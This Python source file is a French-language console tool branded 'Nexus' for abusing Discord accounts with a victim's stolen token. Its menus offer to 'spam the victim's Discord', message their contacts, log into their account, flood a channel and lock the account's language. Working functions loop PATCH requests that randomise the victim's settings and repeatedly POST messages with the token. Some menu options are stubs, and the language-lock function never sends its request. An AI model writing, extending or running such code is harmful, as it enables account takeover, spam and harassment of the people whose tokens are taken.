import os
os.system("")

import time
from colorama import init, Fore
import base64
import requests
import random

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

init(autoreset=True)

def effet_texte_doux(texte, couleur=Fore.RED):
    for char in texte:
        print(couleur + char, end='', flush=True)
    print()

def menu():
    cls()
    while True:
        texte_ascii = r"""
                                     ███╗   ██╗ ███████╗  ██╗  ██╗  ██╗   ██╗  ███████╗
                                     ████╗  ██║ ██╔════╝  ╚██╗██╔╝  ██║   ██║  ██╔════╝
                                     ██╔██╗ ██║ █████╗     ╚███╔╝   ██║   ██║  ███████╗
                                     ██║╚██╗██║ ██╔══╝     ██╔██╗   ██║   ██║  ╚════██║
                                     ██║ ╚████║ ███████╗  ██╔╝ ██╗  ╚██████╔╝  ███████║
                                     ╚═╝  ╚═══╝ ╚══════╝  ╚═╝  ╚═╝   ╚═════╝   ╚══════╝
                                                                                        by Nexus Team
        """
        effet_texte_doux(texte_ascii, couleur=Fore.RED)

        print(Fore.CYAN + "[1] Discord (avec token)\n")
        print(Fore.CYAN + "[2] Discord (sans token)\n")
        print(Fore.CYAN + "[3] A Suivre\n")

        choix = input(Fore.YELLOW + "Choisis une option : ")

        if choix == "1":
            cls()
            token = input(Fore.GREEN + "\nEntrez le token à utiliser : ")
            print(Fore.MAGENTA + f"\nToken enregistré  : {token}")
        
            print(Fore.YELLOW + "\nQue voulez-vous faire ?\n")
            print(Fore.CYAN + "[1] Spam le Discord de la victime (load boucle)\n")
            print(Fore.CYAN + "[2] Spam contact de la victume (envoie de msg à chaque contact)\n")
            print(Fore.CYAN + "[3] Se connecter au compte de la victime\n")
            print(Fore.CYAN + "[4] Contrôle _No GUI_\n")
            print(Fore.CYAN + "[0] Retour au menu principal\n")
            action = input(' ')

            
            if action == "1":
                cls()
                try:
                    time2 = int(input(Fore.GREEN + "\nEntrez le nombre de cycles : "))
                    for i in range(time2):
                        discord_inf_load(token)
                        time.sleep(2.5)
                except ValueError:
                    print(Fore.RED + "\nTu dois entrer un nombre !")
                    time.sleep(1)
                return
            elif action == "2":
                idee()
                return
            elif action == "3":
                cls()

            elif action == "4":
                cls()
                print(Fore.YELLOW + "Que voulez-vous faire ?\n")
                print(Fore.CYAN + "[1] Déconnexion boucle vocale\n")
                print(Fore.CYAN + "[2] Bloquer sur une langue\n")
                print(Fore.CYAN + "[3] Envoie de messages\n")
                print(Fore.CYAN + "[0] Retour au menu principal\n")
                action = input(' ')

                if action == "3":
                    cls()
                    channel_id = input(Fore.GREEN + "\nEntrez l'ID du canal : ")
                    message = input(Fore.GREEN + "\nEntrez le message à envoyer : ")
                    msg_nmbr = int(input(Fore.GREEN + "\nEntrez le nombre de messages à envoyer : "))
                    discord_msg_send(token, message, channel_id, msg_nmbr)
                
            
            elif action == "0":
                menu()
            
            elif action == "2":
                print(Fore.YELLOW + "En quelle langue veux-tu bloquer le compte ?\n")
                print(Fore.CYAN + "[1]   Bulgare            [2]   Chinois (Simplifié)     [3]   Chinois (Traditionnel)")
                print(Fore.CYAN + "[4]   Croate             [5]   Tchèque                 [6]   Danois")
                print(Fore.CYAN + "[7]   Néerlandais        [8]   Anglais Américain       [9]   Anglais Britannique")
                print(Fore.CYAN + "[10]  Finnois            [11]  Français                [12]  Allemand")
                print(Fore.CYAN + "[13]  Grec               [14]  Hindi                   [15]  Hongrois")
                print(Fore.CYAN + "[16]  Italien            [17]  Japonais                [18]  Coréen")
                print(Fore.CYAN + "[19]  Lituanien          [20]  Norvégien               [21]  Polonais")
                print(Fore.CYAN + "[22]  Portugais (Brésil) [23]  Roumain                 [24]  Russe")
                print(Fore.CYAN + "[25]  Espagnol (Espagne) [26]  Suédois                 [27]  Thaïlandais")
                print(Fore.CYAN + "[28]  Turc               [29]  Ukrainien               [30]  Vietnamien\n")

                langue_bloquee = input(" ")

                if langue_bloquee == "1":
                    langue_bloque(token, "bg")
                elif langue_bloquee == "2":
                    langue_bloque(token, "zh-CN")
                elif langue_bloquee == "3":
                    langue_bloque(token, "zh-TW")
                elif langue_bloquee == "4":
                    langue_bloque(token, "hr")
                elif langue_bloquee == "5":
                    langue_bloque(token, "cs")
                elif langue_bloquee == "6":
                    langue_bloque(token, "da")
                elif langue_bloquee == "7":
                    langue_bloque(token, "nl")
                elif langue_bloquee == "8":
                    langue_bloque(token, "en-US")
                elif langue_bloquee == "9":
                    langue_bloque(token, "en-GB")
                elif langue_bloquee == "10":
                    langue_bloque(token, "fi")
                elif langue_bloquee == "11":
                    langue_bloque(token, "fr")
                elif langue_bloquee == "12":
                    langue_bloque(token, "de")
                elif langue_bloquee == "13":
                    langue_bloque(token, "el")
                elif langue_bloquee == "14":
                    langue_bloque(token, "hi")
                elif langue_bloquee == "15":
                    langue_bloque(token, "hu")
                elif langue_bloquee == "16":
                    langue_bloque(token, "it")
                elif langue_bloquee == "17":
                    langue_bloque(token, "ja")
                elif langue_bloquee == "18":
                    langue_bloque(token, "ko")
                elif langue_bloquee == "19":
                    langue_bloque(token, "lt")
                elif langue_bloquee == "20":
                    langue_bloque(token, "no")
                elif langue_bloquee == "21":
                    langue_bloque(token, "pl")
                elif langue_bloquee == "22":
                    langue_bloque(token, "pt-BR")
                elif langue_bloquee == "23":
                    langue_bloque(token, "ro")
                elif langue_bloquee == "24":
                    langue_bloque(token, "ru")
                elif langue_bloquee == "25":
                    langue_bloque(token, "es-ES")
                elif langue_bloquee == "26":
                    langue_bloque(token, "sv-SE")
                elif langue_bloquee == "27":
                    langue_bloque(token, "th")
                elif langue_bloquee == "28":
                    langue_bloque(token, "tr")
                elif langue_bloquee == "29":
                    langue_bloque(token, "uk")
                elif langue_bloquee == "30":
                    langue_bloque(token, "vi")
                else:
                    print(Fore.RED + "\nOption invalide. Réessaie...\n")
                    time.sleep(1)


            else:
                print(Fore.RED + "\nOption invalide. Réessaie...\n")
                time.sleep(1)

                
def token_start():
    cls()
    user_id = input(Fore.GREEN + "\nEntrez l'ID de l'utilisateur à suivre : ")
    encoded_id = base64.b64encode(user_id.encode()).decode()
    print(Fore.MAGENTA + f"\nDébut du token : {encoded_id}")
    save_token = input(Fore.GREEN + f"\nVoulez-vous sauvegarder le token ? (O/N) : ")
    if save_token.lower() == "o":
        with open("token.txt", "w") as file:
            file.write(f"{user_id} : {encoded_id}")
        print(Fore.MAGENTA + "\nLe début du token a été enregistré dans token.txt")
    input(Fore.YELLOW + "\nAppuie sur Entrée pour revenir au menu...")
    menu()

def idee():
    cls()
    print(Fore.BLUE + "\nFonctionnalité à venir... 🚧")
    input(Fore.YELLOW + "\nAppuie sur Entrée pour revenir au menu...")
    menu()
    
#### ENVOIE DE MESSAGE ###
def discord_msg_send(token, message, channel_id, nmbr_msg):
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    data = {
        "content": message
    }
    for _ in range(nmbr_msg):
        response = requests.post(url, headers=headers, json=data)
        if response.status_code == 200 or response.status_code == 204:
            print(Fore.GREEN + "\nMessage envoyé avec succès !")
        else:
            print(Fore.RED + f"\nErreur lors de l'envoi du message. Code d'erreur : {response.status_code}")
        
### SPAM ###
liste_trfa = ["true", "false"]
liste_langue = ["fr", "en-US", "en-GB", "es-ES", "de", "ja", "ko", "pt-BR", "ru", "zh-CN", "zh-TW"]
liste_theme = ["dark", "light"]
liste_status = ["invisible", "online", "dnd", "idle"]

def discord_inf_load(token):
    raid_langue = random.choice(liste_langue)
    raid_theme = random.choice(liste_theme)
    raid_status = random.choice(liste_status)
    raid_enable = random.choice(liste_trfa)

    url = "https://discord.com/api/v9/users/@me/settings"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    data = {
        "locale": raid_langue,
        "theme": raid_theme,
        "status": raid_status,
        "inline_embed_media": True,
        "inline_attachments_media": True,
        "enable_tts_command": False,
        "message_display_compact": False,
        "convert_emoticons": True,
        "stream_notifications_enabled": True,
        "enable_sounds": True,
        "enable_gif_status": True,
        "enable_account_verification_alerts": True,
        "enable_developer_mode": raid_enable,
    }

    response = requests.patch(url, headers=headers, json=data)
    if response.status_code in [200, 204]:
        print(Fore.GREEN + "Paramètres mis à jour.")
    else:
        print(Fore.RED + f"Erreur : {response.status_code}")

def langue_bloque(token, langue):
    url = "https://discord.com/api/v9/users/@me/settings"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    data = {
            "locale": langue
    }
     

        
if __name__ == "__main__":
    menu()
    print(Fore.RED + "\nAppuie sur Entrée pour quitter...")
    input()
